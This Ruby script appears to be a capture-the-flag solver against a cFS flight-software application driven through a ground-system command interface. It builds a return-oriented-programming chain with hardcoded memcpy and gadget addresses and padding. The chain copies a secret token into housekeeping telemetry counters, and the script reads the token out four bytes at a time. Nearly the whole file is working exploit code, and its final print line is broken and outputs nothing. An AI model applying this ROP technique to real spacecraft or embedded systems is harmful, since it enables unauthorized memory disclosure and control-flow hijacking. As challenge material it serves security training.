#!/usr/bin/env ruby

# Rop Chain Solver
# Leaks token byte by byte through ROP APP HK packet

MemCpy = Struct.new(:sz, :src, :dst, :nothing_0, :stk_frame_ptr, :ret_addr, :tlm_header, :nothing_1, :stackalignment)

def bytes_to_nums(bs)
  num_arr = []

  bs.each_char { |byte|
    num_arr.push(byte.ord)
  }

  return num_arr
end

# Just shift ish down # of bytes
def s(num, shift)
    return ((num >> shift*8) & 0xFF) 
end

def u32(num)
    return [s(num,0), s(num,1), s(num,2), s(num,3)].pack("C*")
end  
def p32(num)
    return bytes_to_nums([num].pack("L"))
  end
def p64(num)
  return bytes_to_nums([num].pack("Q"))
end

def num_to_chars(num)
  [num].unpack("4c")
end

$rop_cmd_skel = "ROP_APP STAGE_1 with CCSDS_STREAMID 6512, CCSDS_SEQUENCE 49152, CCSDS_LENGTH 65, CCSDS_FUNCCODE 2, CCSDS_CHECKSUM 0, ARRAY %s"

$stackalignment_addr = 0x692e3786   # OS_Timer_NoArgCallback+34
$memcpy_addr         = 0x692dc458
$stack_frame_ptr     = 0x940adc9c

def cfs_memcpy(dst, src, n)
    tlm_header = [0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00]
    
    nothing_0 = bytes_to_nums(("A" * 12))
    nothing_1 = bytes_to_nums(("A" * 28))

    rop_arr = [*p32(n),
        *p32(src),
        *p32(dst),
        *nothing_0,
        *p32($stack_frame_ptr),
        *p32($memcpy_addr),
        *nothing_1,
        *p32($stackalignment_addr)]

    rop_cmd = $rop_cmd_skel % [rop_arr]

    return rop_cmd
end

HkPkt = Struct.new(:ValidCmdCnt, :InvalidCmdCnt)

PktAddrs = HkPkt.new(0x942030d0, 0x942030d0 + 2)
token_addr = 0x94203014
token_size = 9

flag = ""
for byte_idx in (0..token_size).step(4) do
  rop_cmd = cfs_memcpy(PktAddrs.ValidCmdCnt, token_addr + byte_idx, 0x4)
  
  cmd(rop_cmd)
  
  # Wait until we increment a single HK_TLM Packet
  ra_tlm_rc = tlm("ROP_APP HK_TLM_PKT RECEIVED_COUNT")
  wait(5)
  wait_check("ROP_APP HK_TLM_PKT RECEIVED_COUNT > #{ra_tlm_rc}", 10)
  
  flag_c = (tlm("ROP_APP HK_TLM_PKT CMD_ERROR_COUNT") << 16 | tlm("ROP_APP HK_TLM_PKT CMD_VALID_COUNT"))
  
  flag += u32(flag_c).to_s

  puts "flag: #{flag}"
end
puts "final flag: #{}"
